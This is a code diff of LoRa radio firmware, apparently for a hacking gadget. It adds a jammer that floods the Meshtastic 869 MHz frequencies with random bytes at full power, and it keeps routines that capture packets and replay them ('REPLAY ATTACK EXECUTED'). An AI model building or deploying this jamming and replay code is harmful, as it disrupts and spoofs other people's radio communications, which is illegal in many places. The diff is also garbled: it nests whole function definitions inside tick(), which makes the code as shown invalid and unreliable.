@@ -14,8 +14,10 @@ void LoraManager::begin() {
 }
 
 void LoraManager::setMode(bool active) {
+  if (!active)
+    stopJamming();
   active_ = active;
-  if (active) {
+  if (active && !isJamming_) {
     Serial.println("[LORA] Powering UP SX1262 (SIGINT)...");
     // Meshtastic: 869.525 MHz, BW 250 kHz, SF 11, CR 5, SyncWord 0x2B
     int state =
@@ -27,118 +29,163 @@ void LoraManager::setMode(bool active) {
       Serial.printf("[LORA] Init Failed, code %d\n", state);
     }
   } else {
+    stopJamming();
     radio_.sleep();
     Serial.println("[LORA] Sleeping...");
   }
 }
 
-void LoraManager::captureAndStore(const uint8_t *rawData, size_t len,
-                                  float rssi, float snr) {
-  if (len == 0 || len > LORA_RAW_PACKET_MAX)
+static const float JAM_FREQS[] = {869.4f, 869.5f, 869.6f};
+static const int JAM_FREQ_COUNT = 3;
+#define LORA_JAM_POWER 22
+
+void LoraManager::startJamming(float centerFreq) {
+  if (isJamming_)
     return;
-
-  lastPacket_.rssi = rssi;
-  lastPacket_.snr = snr;
-  lastPacket_.timestamp = millis();
-  packetCount_++;
-
-  String hexOut = "";
-  for (size_t i = 0; i < len; i++) {
-    char cbuf[4];
-    snprintf(cbuf, sizeof(cbuf), "%02X ", (unsigned)rawData[i]);
-    hexOut += cbuf;
-  }
-  lastPacket_.data = hexOut;
-
-  // Store for replay (last packet only)
-  lastPacketRawLen_ = len < LORA_RAW_PACKET_MAX ? len : LORA_RAW_PACKET_MAX;
-  memcpy(lastPacketRaw_, rawData, lastPacketRawLen_);
-
-  // Ring buffer: last 3 packets
-  int idx = packetBufferHead_ % LORA_PACKET_BUF_SIZE;
-  packetBuffer_[idx].len = lastPacketRawLen_;
-  packetBuffer_[idx].rssi = rssi;
-  packetBuffer_[idx].snr = snr;
-  packetBuffer_[idx].timestamp = lastPacket_.timestamp;
-  memcpy(packetBuffer_[idx].data, rawData, packetBuffer_[idx].len);
-
-  packetBufferHead_++;
-  if (packetBufferCount_ < LORA_PACKET_BUF_SIZE)
-    packetBufferCount_++;
-}
-
-void LoraManager::replayLast() {
-  if (lastPacketRawLen_ == 0 || !active_)
+  (void)centerFreq;
+  Serial.println("[SILENCE] Starting 868 MHz jammer (+22 dBm)...");
+  int state = radio_.begin(869.5f, 250.0f, 11, 5, MESHTASTIC_SYNC_WORD, 22, 8);
+  if (state != RADIOLIB_ERR_NONE) {
+    Serial.printf("[SILENCE] Init failed %d\n", state);
     return;
-  int state = radio_.transmit(lastPacketRaw_, lastPacketRawLen_);
-  if (state == RADIOLIB_ERR_NONE) {
-    Serial.println("[HACK] REPLAY ATTACK EXECUTED");
-    radio_.startReceive();
-  } else {
-    Serial.printf("[HACK] Replay failed %d\n", state);
-    radio_.startReceive();
   }
+  radio_.setOutputPower(LORA_JAM_POWER);
+  active_ = true;
+  isJamming_ = true;
+  jamHopIndex_ = 0;
 }
 
-void LoraManager::clearBuffer() {
-  packetBufferCount_ = 0;
-  packetBufferHead_ = 0;
-  lastPacketRawLen_ = 0;
-  lastPacket_.data = "";
-  lastPacket_.rssi = 0;
-  lastPacket_.snr = 0;
-  packetCount_ = 0;
-  Serial.println("[LORA] Buffer cleared.");
-}
-
-const int8_t *LoraManager::getRssiHistory(int &outLen) const {
-  outLen = rssiHistoryCount_;
-  return rssiHistory_;
-}
-
-const LoraRawPacket *LoraManager::getPacketInBuffer(int index) const {
-  if (index < 0 || index >= packetBufferCount_)
-    return nullptr;
-  int idx = (packetBufferHead_ - 1 - index + LORA_PACKET_BUF_SIZE) %
-            LORA_PACKET_BUF_SIZE;
-  return &packetBuffer_[idx];
+void LoraManager::stopJamming() {
+  if (!isJamming_)
+    return;
+  isJamming_ = false;
+  radio_.sleep();
+  Serial.println("[SILENCE] Jammer OFF.");
 }
 
 void LoraManager::tick() {
   if (!active_)
     return;
 
+  if (isJamming_) {
+    float freq = JAM_FREQS[jamHopIndex_ % JAM_FREQ_COUNT];
+    radio_.setFrequency(freq);
+    for (size_t i = 0; i < sizeof(jamBuf_); i++)
+      jamBuf_[i] = (uint8_t)(esp_random() & 0xFF);
+    radio_.transmit(jamBuf_, sizeof(jamBuf_));
+    jamHopIndex_++;
+    return;
+  }
+
   unsigned long now = millis();
 
-  // 1. Spectrum monitor: RSSI sample every 100ms
-  if (now - lastRssiSampleMs_ >= 100) {
-    lastRssiSampleMs_ = now;
-    int rssiVal = (int)radio_.getRSSI();
-    if (rssiVal >= -128 && rssiVal <= 127) {
-      rssiHistory_[rssiHistoryHead_] = (int8_t)rssiVal;
-      rssiHistoryHead_ = (rssiHistoryHead_ + 1) % LORA_RSSI_HISTORY_LEN;
-      if (rssiHistoryCount_ < LORA_RSSI_HISTORY_LEN)
-        rssiHistoryCount_++;
+  void LoraManager::captureAndStore(const uint8_t *rawData, size_t len,
+                                    float rssi, float snr) {
+    if (len == 0 || len > LORA_RAW_PACKET_MAX)
+      return;
+
+    lastPacket_.rssi = rssi;
+    lastPacket_.snr = snr;
+    lastPacket_.timestamp = millis();
+    packetCount_++;
+
+    String hexOut = "";
+    for (size_t i = 0; i < len; i++) {
+      char cbuf[4];
+      snprintf(cbuf, sizeof(cbuf), "%02X ", (unsigned)rawData[i]);
+      hexOut += cbuf;
     }
-    currentRSSI_ = (float)rssiVal;
-    lastUpdate_ = now;
+    lastPacket_.data = hexOut;
+
+    // Store for replay (last packet only)
+    lastPacketRawLen_ = len < LORA_RAW_PACKET_MAX ? len : LORA_RAW_PACKET_MAX;
+    memcpy(lastPacketRaw_, rawData, lastPacketRawLen_);
+
+    // Ring buffer: last 3 packets
+    int idx = packetBufferHead_ % LORA_PACKET_BUF_SIZE;
+    packetBuffer_[idx].len = lastPacketRawLen_;
+    packetBuffer_[idx].rssi = rssi;
+    packetBuffer_[idx].snr = snr;
+    packetBuffer_[idx].timestamp = lastPacket_.timestamp;
+    memcpy(packetBuffer_[idx].data, rawData, packetBuffer_[idx].len);
+
+    packetBufferHead_++;
+    if (packetBufferCount_ < LORA_PACKET_BUF_SIZE)
+      packetBufferCount_++;
   }
 
-  // 2. Check for packet
-  uint8_t buf[LORA_RAW_PACKET_MAX];
-  int state = radio_.readData(buf, sizeof(buf));
-
-  if (state == RADIOLIB_ERR_NONE) {
-    Serial.println("[LORA] PACKET CAPTURED!");
-    size_t len = radio_.getPacketLength();
-    if (len > sizeof(buf))
-      len = sizeof(buf);
-    float rssi = radio_.getRSSI();
-    float snr = radio_.getSNR();
-    captureAndStore(buf, len, rssi, snr);
-    radio_.startReceive();
-  } else if (state != RADIOLIB_ERR_RX_TIMEOUT &&
-             state != RADIOLIB_ERR_CRC_MISMATCH) {
-    radio_.startReceive();
+  void LoraManager::replayLast() {
+    if (lastPacketRawLen_ == 0 || !active_)
+      return;
+    int state = radio_.transmit(lastPacketRaw_, lastPacketRawLen_);
+    if (state == RADIOLIB_ERR_NONE) {
+      Serial.println("[HACK] REPLAY ATTACK EXECUTED");
+      radio_.startReceive();
+    } else {
+      Serial.printf("[HACK] Replay failed %d\n", state);
+      radio_.startReceive();
+    }
   }
-}
+
+  void LoraManager::clearBuffer() {
+    packetBufferCount_ = 0;
+    packetBufferHead_ = 0;
+    lastPacketRawLen_ = 0;
+    lastPacket_.data = "";
+    lastPacket_.rssi = 0;
+    lastPacket_.snr = 0;
+    packetCount_ = 0;
+    Serial.println("[LORA] Buffer cleared.");
+  }
+
+  const int8_t *LoraManager::getRssiHistory(int &outLen) const {
+    outLen = rssiHistoryCount_;
+    return rssiHistory_;
+  }
+
+  const LoraRawPacket *LoraManager::getPacketInBuffer(int index) const {
+    if (index < 0 || index >= packetBufferCount_)
+      return nullptr;
+    int idx = (packetBufferHead_ - 1 - index + LORA_PACKET_BUF_SIZE) %
+              LORA_PACKET_BUF_SIZE;
+    return &packetBuffer_[idx];
+  }
+
+  void LoraManager::tick() {
+    if (!active_)
+      return;
+
+    unsigned long now = millis();
+
+    // 1. Spectrum monitor: RSSI sample every 100ms
+    if (now - lastRssiSampleMs_ >= 100) {
+      lastRssiSampleMs_ = now;
+      int rssiVal = (int)radio_.getRSSI();
+      if (rssiVal >= -128 && rssiVal <= 127) {
+        rssiHistory_[rssiHistoryHead_] = (int8_t)rssiVal;
+        rssiHistoryHead_ = (rssiHistoryHead_ + 1) % LORA_RSSI_HISTORY_LEN;
+        if (rssiHistoryCount_ < LORA_RSSI_HISTORY_LEN)
+          rssiHistoryCount_++;
+      }
+      currentRSSI_ = (float)rssiVal;
+      lastUpdate_ = now;
+    }
+
+    // 2. Check for packet
+    uint8_t buf[LORA_RAW_PACKET_MAX];
+    int state = radio_.readData(buf, sizeof(buf));
+
+    if (state == RADIOLIB_ERR_NONE) {
+      Serial.println("[LORA] PACKET CAPTURED!");
+      size_t len = radio_.getPacketLength();
+      if (len > sizeof(buf))
+        len = sizeof(buf);
+      float rssi = radio_.getRSSI();
+      float snr = radio_.getSNR();
+      captureAndStore(buf, len, rssi, snr);
+      radio_.startReceive();
+    } else if (state != RADIOLIB_ERR_RX_TIMEOUT &&
+               state != RADIOLIB_ERR_CRC_MISMATCH) {
+      radio_.startReceive();
+    }
+  }
